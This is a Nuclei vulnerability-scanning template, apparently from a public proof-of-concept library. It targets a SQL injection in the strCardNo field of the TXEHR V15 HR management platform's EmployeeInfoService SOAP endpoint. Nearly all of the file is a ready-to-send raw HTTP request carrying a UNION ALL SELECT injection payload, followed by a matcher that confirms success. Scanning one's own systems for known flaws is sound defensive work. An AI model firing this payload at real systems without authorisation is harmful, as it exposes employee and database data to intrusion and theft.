pocs/nuclei/tongxiang-EmployeeInfoService-sqli.yaml

id: tongxiang-EmployeeInfoService-sqli
info:
  name: Template Name
  author: wangzong
  severity: high
  description: 同享TXEHR V15人力管理管理平台strCardNo存在SQL注入漏洞
  reference:
    - https://github.com/k3ppf0r/2024-PocLib/commit/40ce8eec379ea65f0c68373e7434a993d90b4e52
  tags: tags
http:
  - raw:
      - |-
        POST /Service/EmployeeInfoService.asmx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
        Accept: */*
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Content-Type: text/xml;charset=UTF-8
        Connection: close
        Content-Length: 970

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
                <soapenv:Header/>
                  <soapenv:Body>
                      <tem:GetEmployeeByCardNo>
                        <!--type: string-->
                        <tem:strCardNo>1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(113)+CHAR(106)+CHAR(112)+CHAR(113)+CHAR(112)+CHAR(67)+CHAR(71)+CHAR(99)+CHAR(84)+CHAR(70)+CHAR(73)+CHAR(110)+CHAR(110)+CHAR(97)+CHAR(70)+CHAR(108)+CHAR(113)+CHAR(98)+CHAR(99)+CHAR(108)+CHAR(85)+CHAR(117)+CHAR(97)+CHAR(108)+CHAR(72)+CHAR(66)+CHAR(75)+CHAR(82)+CHAR(69)+CHAR(113)+CHAR(116)+CHAR(120)+CHAR(72)+CHAR(115)+CHAR(78)+CHAR(113)+CHAR(65)+CHAR(117)+CHAR(80)+CHAR(110)+CHAR(102)+CHAR(112)+CHAR(90)+CHAR(111)+CHAR(113)+CHAR(118)+CHAR(122)+CHAR(107)+CHAR(113)-- HxKT</tem:strCardNo>
                      </tem:GetEmployeeByCardNo>
                  </soapenv:Body>
                </soapenv:Envelope>
    matchers:
      - type: word
        part: body
        words:
          - 'qqjpqpCGcTFInnaF'
